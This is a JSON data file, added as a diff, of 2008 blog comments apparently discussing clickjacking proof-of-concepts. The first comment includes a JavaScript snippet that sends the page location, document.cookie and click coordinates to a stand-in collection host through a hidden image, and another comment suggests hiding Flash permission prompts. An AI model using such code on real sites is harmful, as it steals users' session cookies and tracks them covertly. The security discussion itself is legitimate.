@@ -1,0 +1,38 @@
+[
+  {
+    "author": "unwiredbrain",
+    "avatar": "27a21572566e7cbb44e0d33ef6b0b6e1",
+    "date": "2008-10-08T21:39:11.000Z",
+    "content": "Little point of interest: an attacker could be very interested in <strong>where</strong> the victim clicked.\r\n\r\nI mean: placing the attack on multiple elements can give to the attacker informations about page \"hot spots\" i.e. where the people most commonly click, allowing them to profile a better attack, according to the user feedback.\r\n\r\nHere's the code:\r\n<pre><code>var request = \"http://www.example.com/collectingDataScript.jpg?l=\" \r\n        + escape(document.location) + \"&amp;c=\" + escape(document.cookie) + \"&amp;x=\" \r\n        + c.x + \"&amp;y=\" + c.y;\r\n\r\nvar clickLogger = document.createElement(\"img\");\r\n    clickLogger.setAttribute(\"style\", \"position:absolute;left:-9999px;width:0;height:0;\");\r\n    clickLogger.setAttribute(\"src\", request);</code></pre>\r\n\r\nIf you're using Firebug, you'll see in the Net panel the requests the script makes.\r\n\r\nGoing a little further, in HTML 5 frames can send messages to each other [1], so there will be no more need to use a double click: the inline frame will only have to watch for messages from the hosting window!\r\n\r\n[1] http://it.youtube.com/watch?v=xIxDJof7xxQ -- from 05:40 to 15:20"
+  },
+  {
+    "author": "mindcorrosive",
+    "avatar": "be3b138352dc100c9459e612b275b413",
+    "date": "2008-10-08T23:51:24.000Z",
+    "content": "I never knew that it was *that* easy.. Though you could probably mask the suspicious Flash-UI \"Allow\" button with an UI element as well, for maximum user frustration.."
+  },
+  {
+    "author": "Mr.V",
+    "avatar": "a91d8b2df902bcca4415f304dc589ec3",
+    "date": "2008-10-09T02:54:23.000Z",
+    "content": "I'm getting noscript's clicjacking warning every time I try to open google images :( help."
+  },
+  {
+    "author": "gnucitizen reader",
+    "avatar": "93fbcd57493dcc4f89fe44b8484237fe",
+    "date": "2008-10-09T05:54:49.000Z",
+    "content": "is it just me or any of your pocs are prepared to be functional?"
+  },
+  {
+    "author": "pdp",
+    "avatar": "c4db4e65c9f09f2a373fcaefa5e2bfb4",
+    "date": "2008-10-09T06:54:30.000Z",
+    "content": "the pocs are fully functional. they have been verified by a few close friends. \r\n\r\nunwiredbrain, you are absolutely right. I could have made the event bubble but a POC is a POC and nothing more :)"
+  },
+  {
+    "author": "unwiredbrain",
+    "avatar": "27a21572566e7cbb44e0d33ef6b0b6e1",
+    "date": "2008-10-09T16:29:00.000Z",
+    "content": "<strong>pdp</strong>, yeah, my biggest interest was pointing out that in the next HTML specification things about clickjacking will be easier than ever to set up.\r\n\r\nThe <em>where-victim-clicked</em> stuff was my POC of your POC ;-) :-P"
+  }
+]
